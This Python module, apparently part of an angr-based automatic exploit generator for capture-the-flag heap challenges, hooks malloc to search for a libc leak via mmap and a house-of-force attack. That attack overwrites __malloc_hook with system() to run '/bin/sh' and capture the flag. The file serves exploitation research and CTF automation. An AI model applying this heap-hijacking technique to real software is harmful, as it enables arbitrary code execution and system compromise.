import ctypes

from angr.procedures.posix.mmap import mmap

from .utils import *
from .mod_technique import *
import angr.procedures.libc.malloc


class PTMallocChunk:
    def __init__(self, addr, chunk_size, real_addr, free=False, tag=None):
        self.addr = addr
        self.size = chunk_size
        self.real_addr = real_addr
        self.free = free
        self.tag = tag


class ReplaceMalloc(angr.procedures.libc.malloc.malloc):
    def __init__(self, challenge):
        super().__init__()
        self.challenge = challenge

    def run(self, sim_size):
        if sim_size.symbolic:
            # note that solving sim size from functions like atoi or atol is EXTREMELY slow
            new_states = []
            binary = self.state.globals['binary']
            log.info("can control malloc size")

            if (not binary.io_seg_addr.get('libc') and not self.state.globals.get('leak_libc_by_mmap') and
                    self.state.satisfiable(extra_constraints=[sim_size == 0x200000])):
                log.success("malloc size can be large, consider use mmap to leak libc")
                new_state = self.state.copy()
                new_state.add_constraints(sim_size == 0x200000)
                new_state.globals['binary'] = binary.__copy__()
                new_state.globals['leak_libc_by_mmap'] = True
                new_state.memory.map_region(ARCH_64_MMAP_BASE, 0x10, 3, init_zero=0)
                malloc_addr = ARCH_64_MMAP_BASE
                new_state.regs.rax = malloc_addr
                new_states.append(new_state)
            if not self.state.globals.get('hof') and self.state.satisfiable(extra_constraints=[sim_size == 0xff3f3f3f]):
                if binary.io_seg_addr.get('libc'):
                    log.success("malloc size can be large, consider house of force")
                    new_state = self.state.copy()
                    new_state.add_constraints(sim_size == 8)
                    malloc_addr = new_state.heap.malloc(8)
                    new_state.regs.rax = malloc_addr
                    new_state.globals['binary'] = binary.__copy__()
                    new_state.globals['binary'].chunk_maps[malloc_addr] = PTMallocChunk(malloc_addr, 8, 0)
                    # we can get the real malloc addr when PIE is disabled, but now we assume PIE is enabled
                    new_state.globals['hof'] = [new_state.heap.malloc(8), new_state.heap.malloc(8)]
                    new_state.globals['heap_inspect'] = \
                        HeapOverflowInspector(malloc_addr + 24, 8, p64(0xffffffffffffffff), 'hof_big_chunk')
                    new_states.append(new_state)

            if self.state.globals.get('hof_big_chunk') \
                    and binary.io_seg_addr.get('libc') and binary.io_seg_addr.get('heap'):
                self.state.globals['hof_big_chunk'] = False
                new_state = self.state.copy()
                new_binary = binary.__copy__()
                new_state.globals['binary'] = new_binary
                libc = ELF(new_binary.libc, checksec=False)
                libc.address = new_binary.io_seg_addr['libc']
                target_addr = libc.symbols['__malloc_hook']
                log.info(f"Calculating malloc size to get __malloc_hook at {hex(target_addr)}")

                known_real_addr_chunk = get_chunk_by_tag(new_binary, 'known_real_addr')
                malloc_addr = new_state.globals['hof'][0]
                user_malloc_offset = malloc_addr - known_real_addr_chunk.addr
                next_real_addr = known_real_addr_chunk.real_addr + user_malloc_offset
                malloc_chunk_size = ctypes.c_uint64(target_addr - next_real_addr).value - 0x18 + 0x10
                log.info(f"Testing next malloc size {hex(malloc_chunk_size)}")
                if new_state.satisfiable(extra_constraints=[sim_size == malloc_chunk_size]):
                    log.info(f"Trying make malloc return ptr to __malloc_hook")
                    for bin_sh_chunk in new_state.globals['binary'].chunk_maps.values():
                        if bin_sh_chunk.real_addr:
                            bin_sh_constraint = (new_state.memory.load(bin_sh_chunk.addr, size=8) == b'/bin/sh\x00')
                            if new_state.satisfiable(extra_constraints=[bin_sh_constraint]):
                                log.info(f"Use /bin/sh write to {hex(bin_sh_chunk.real_addr)}")
                                new_state.add_constraints(bin_sh_constraint)
                                new_state.add_constraints(sim_size == malloc_chunk_size)
                                new_state.globals['binary'].chunk_maps[malloc_addr] = PTMallocChunk(malloc_addr, 8, 0)
                                new_state.regs.rax = malloc_addr
                                new_state.globals['hof_system'] = libc.symbols['system']
                                new_state.globals['hof_sh_chunk'] = bin_sh_chunk.real_addr
                                # new_state.globals['binary'].constant_to_be_add.append(sim_size == malloc_chunk_size)
                                new_states.append(new_state)
                                break
            elif self.state.globals.get('hof_system'):
                log.info("Check constraint sim_size == 8 is satisfiable")
                if self.state.satisfiable(extra_constraints=[sim_size == 8]):
                    self.state.add_constraints(sim_size == 8)
                    system = self.state.globals['hof_system']
                    self.state.globals['hof_system'] = False
                    self.state.globals['hof_og'] = -1
                    log.info(f"Trying house of force to call system when malloc: {hex(system)}")
                    malloc_addr = self.state.globals['hof'][1]
                    self.state.regs.rax = malloc_addr
                    self.state.globals['heap_inspect'] = HeapOverflowInspector(malloc_addr, 8, p64(system), 'hof_sh')
                    new_states.append(self.state)
            elif self.state.globals.get('hof_sh'):
                self.state.globals['hof_sh'] = False
                chunk_addr = self.state.globals['hof_sh_chunk']
                log.info(f"Check constraint sim_size == {hex(chunk_addr)} is satisfiable")
                if self.state.satisfiable(extra_constraints=[sim_size == chunk_addr]):
                    self.state.add_constraints(sim_size == chunk_addr)
                    log.info(f"Trying malloc to get flag")
                    binary.get_flag(self.state, dump_payload(self.state, False))
                    self.exit(0)
            if len(new_states):
                reorder_successors(self, new_states)
            else:
                # move self.state to dead end
                ...
        else:
            malloc_size = self.state.solver.eval(sim_size)
            log.info("malloc a chunk with size: " + str(malloc_size))
            return self.state.heap.malloc(self.state.solver.eval(malloc_size))
